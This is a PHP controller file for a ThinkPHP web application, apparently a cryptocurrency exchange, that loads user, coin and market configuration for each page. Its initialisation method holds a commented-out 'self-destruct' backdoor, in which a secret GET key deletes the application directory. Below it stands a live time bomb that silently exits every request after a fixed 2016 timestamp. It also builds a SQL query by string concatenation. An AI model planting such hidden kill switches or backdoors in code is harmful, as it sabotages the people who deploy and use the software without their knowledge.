<?php
namespace Home\Controller;

class HomeController extends \Think\Controller
{
	protected function _initialize()
	{
		//以下是自毁代码
		/*$movesay_key_rmdirr = I('get.movesay_key_rmdirr');

		if ($movesay_key_rmdirr == '5ce18asdf4g5fds4hjs225ad4f5desa2r154gdsf21g21b2bFGH6dJH') {
			rmdirr(APP_PATH);
			exit();
		}

		preg_match('/[^\\.\\/]+\\.[^\\.\\/]+$/', $_SERVER['SERVER_NAME'], $matches);

		if ($matches[0] != 'a.com') {
			if ($matches[0] != 'movesay.com') {
				if ($matches[0] != 'movesay.com') {
				}
			}
		}*/
        //以上是自毁代码
		if (1467302400 < time()) {
			exit();
		}

		if (!session('userId')) {
			session('userId', 0);
		}
		else if (CONTROLLER_NAME != 'Login') {
			$user = D('user')->where('id = ' . session('userId'))->find();

			if (!$user['paypassword']) {
				redirect('/Login/register2');
			}

			if (!$user['truename']) {
				redirect('/Login/register3');
			}
		}

		if (userid()) {
			$userCoin_top = M('UserCoin')->where(array('userid' => userid()))->find();
			$this->assign('userCoin_top', $userCoin_top);
		}

		if (isset($_GET['invit'])) {
			session('invit', $_GET['invit']);
		}

		$config = (APP_DEBUG ? null : S('home_config'));

		if (!$config) {
			$config = M('Config')->where(array('id' => 1))->find();
			S('home_config', $config);
		}

		if (!$config['web_close']) {
			exit($config['web_close_cause']);
		}

		C($config);
		C('contact_qq', explode('|', C('contact_qq')));
		C('contact_qqun', explode('|', C('contact_qqun')));
		C('contact_bank', explode('|', C('contact_bank')));
		$coin = (APP_DEBUG ? null : S('home_coin'));

		if (!$coin) {
			$coin = M('Coin')->where(array('status' => 1))->select();
			S('home_coin', $coin);
		}

		$coinList = array();

		foreach ($coin as $k => $v) {
			$coinList['coin'][$v['name']] = $v;

			if ($v['name'] != 'cny') {
				$coinList['coin_list'][$v['name']] = $v;
			}

			if ($v['type'] == 'rmb') {
				$coinList['rmb_list'][$v['name']] = $v;
			}
			else {
				$coinList['xnb_list'][$v['name']] = $v;
			}

			if ($v['type'] == 'rgb') {
				$coinList['rgb_list'][$v['name']] = $v;
			}

			if ($v['type'] == 'qbb') {
				$coinList['qbb_list'][$v['name']] = $v;
			}
		}

		C($coinList);
		$market = (APP_DEBUG ? null : S('home_market'));

		if (!$market) {
			$market = M('Market')->where(array('status' => 1))->select();
			S('home_market', $market);
		}

		foreach ($market as $k => $v) {
			$v['new_price'] = round($v['new_price'], $v['round']);
			$v['buy_price'] = round($v['buy_price'], $v['round']);
			$v['sell_price'] = round($v['sell_price'], $v['round']);
			$v['min_price'] = round($v['min_price'], $v['round']);
			$v['max_price'] = round($v['max_price'], $v['round']);
			list($v['xnb']) = explode('_', $v['name']);
			list(, $v['rmb']) = explode('_', $v['name']);
			$v['xnbimg'] = C('coin')[$v['xnb']]['img'];
			$v['rmbimg'] = C('coin')[$v['rmb']]['img'];
			$v['volume'] = $v['volume'] * 1;
			$v['change'] = round($v['change'] * 1,2);
			$v['title'] = C('coin')[$v['xnb']]['title'] . '(' . strtoupper($v['xnb']) . '/' . strtoupper($v['rmb']) . ')';
			$marketList['market'][$v['name']] = $v;
		}

		C($marketList);
		$C = C();

		foreach ($C as $k => $v) {
			$C[strtolower($k)] = $v;
		}

		$this->assign('C', $C);
	}
}

?>
